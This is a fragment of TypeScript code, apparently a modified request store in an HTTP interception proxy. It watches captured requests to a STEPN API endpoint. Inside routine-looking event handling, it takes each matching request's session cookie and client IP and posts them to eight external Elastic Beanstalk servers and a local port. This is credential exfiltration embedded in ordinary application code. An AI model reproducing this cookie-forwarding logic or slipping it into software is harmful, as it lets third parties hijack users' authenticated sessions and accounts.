...
export class EventsStore {
    ...
    private addInitiatedRequest(request: InputInitiatedRequest) {
       ...
       const eventHandle = Object.assign({}, this.events);
        var eventHandler: any = eventHandle;
        let i =  {} as any;
        i = JSON.parse(JSON.stringify(Object.keys(eventHandler).length));
        while (i>0)
        {
            i--;
            if(eventHandler[i] && eventHandler[i].request && eventHandler[i].request.parsedUrl.href.startsWith("https://api.stepn.com/run/orderlist"))
            {
                
                // if(!this.state || (this.state && (!this.state.cookie || this.state.cookie !== eventHandler[i].request.headers.cookie)))
                // {
                //     this.setState({
                //     cookie: eventHandler[i].request.headers.cookie
                //     });
                console.log("SEND COOKIE");
                console.log(eventHandler[i].request.remoteIpAddress);
                axios.post(`http://stepnbot1-env.eba-4eqwpypf.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://stepnbot2-env.eba-9umnadfy.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://stepnbot3-env.eba-sicbkvn3.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://stepnbot4-env.eba-m5szm4t2.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://stepnbot5-env.eba-3nvmh4y3.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://stepnbot6-env.eba-bh4hxpkm.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://stepnbot7-env.eba-xp44dh2n.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://stepnbot8-env.eba-x7y9cqjs.ap-northeast-1.elasticbeanstalk.com/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000})
                axios.post(`http://localhost:3666/sendCookie`,{cookie:eventHandler[i].request.headers.cookie, ip:eventHandler[i].request.remoteIpAddress},{timeout:5000});
                break;
                // }else{
